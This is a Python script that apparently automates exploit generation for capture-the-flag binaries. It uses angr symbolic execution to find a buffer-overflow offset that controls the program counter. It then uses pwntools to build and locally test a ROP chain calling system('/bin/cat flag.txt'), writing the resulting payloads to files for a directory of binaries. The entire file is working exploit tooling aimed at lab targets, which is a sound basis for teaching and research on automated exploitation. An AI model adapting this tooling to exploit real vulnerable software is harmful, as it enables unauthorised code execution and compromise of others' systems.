from logging import getLogger, basicConfig
import os
import concurrent.futures
import time
basicConfig(filename="/dev/null", level="INFO") # otherwise pwntools and angr logging clash
import pwn
import angr


getLogger('angr').setLevel('CRITICAL')
getLogger('cle').setLevel('CRITICAL')


def check_mem_corruption(simgr):
    if len(simgr.unconstrained):
        for path in simgr.unconstrained:
            if path.satisfiable(extra_constraints=[path.regs.pc == b"CCCCCCCC"]):
                path.add_constraints(path.regs.pc == b"CCCCCCCC")
                if path.satisfiable():
                    simgr.stashes['memory_corruption'].append(path)
                simgr.stashes['unconstrained'].remove(path)
                simgr.drop(stash='active')
    return simgr


def find_offset(binary_name: str) -> tuple:
    # create angr project
    project = angr.Project(binary_name)
    state = project.factory.full_init_state()

    sim = project.factory.simgr(state, save_unconstrained=True)
    # create a stash to store states with memory corruption
    sim.stashes['memory_corruption'] = []

    # call check_mem_corruption() on each step
    sim.explore(step_func=check_mem_corruption)

    if len(sim.memory_corruption) > 0:
        solution_state = sim.memory_corruption[0]
        payload = solution_state.posix.dumps(0)
        offset = payload.decode().find('CCCCCCCC')
        valid_payload_offset = payload.split(b'CCCCCCCC')[0]
        pwn.log.info(f"Crashed the program with payload: {payload}")
        pwn.log.info(f"Offset: {offset}")
        return True, valid_payload_offset
    else:
        return False, b""
        raise Exception(f'[!] Could not find the solution for {binary_name}')


def generate_poc(binary_name: str) -> int:
    pwn.context.log_level = "WARNING"  # cut out any output that would clutter the terminal
    # use ELF and context to set architecture, endianess, etc. automatically
    elf = pwn.context.binary = pwn.ELF(binary_name, checksec=False)
    # initialize ROP module to make gadgets, symbols etc. callable
    rop = pwn.ROP(elf)
    solved, offset = find_offset(elf.path)
    if not solved:
        return 0
    # automatically generate a rop chain to call system("/bin/cat flag.txt")
    rop.raw(rop.ret) # fix the movabs issue
    rop.call("system", [next(elf.search(b'/bin/cat flag.txt'))])
    rop.call("exit")
    pwn.log.info(rop.dump())

    payload = offset + rop.chain()
    # this is optional, to be sure the exploit definitely works
    if test_payloads:
        with pwn.process([elf.path]) as target:

            target.sendline(payload)
            if b"flag{test_flag}" not in target.recvall(timeout=2):
                return 0

    with open(os.path.join(solution_dir, binary_name.split("/")[1] + ".bin"), "wb") as poc_file:
        poc_file.write(payload)
    return 1


def main():
    # create a list of file names for all the binaries
    if not os.path.isdir(binary_directory):
        os.mkdir(binary_directory)
    if not os.path.isdir(solution_dir):
        os.mkdir(solution_dir)
    files = [os.path.join(binary_directory, file) for file in os.listdir(binary_directory)]

    start_time = time.time()
    poc_progress = pwn.log.progress("POCs Generated")
    pocs_completed = 0
    poc_progress.status(str(pocs_completed))
    # run each automatic exploit gen in a new process
    with concurrent.futures.ProcessPoolExecutor(max_workers=4) as pool:
        futures = pool.map(generate_poc, files)
        for future in futures:
            pocs_completed += future
            poc_progress.status(str(pocs_completed))

    # we would want same number of POCs and binaries to be considered successful
    execution_time = (time.time() - start_time)
    if pocs_completed == len(files):
        poc_progress.success(f"{pocs_completed}\t[Completed] Took: {execution_time} Seconds")
    else:
        poc_progress.failure(f"{pocs_completed}\t[Failed to Generate All POCs] Took: {execution_time} Seconds")


if __name__ == "__main__":
    binary_directory = "binaries"
    solution_dir = "solutions"
    test_payloads = True
    main()
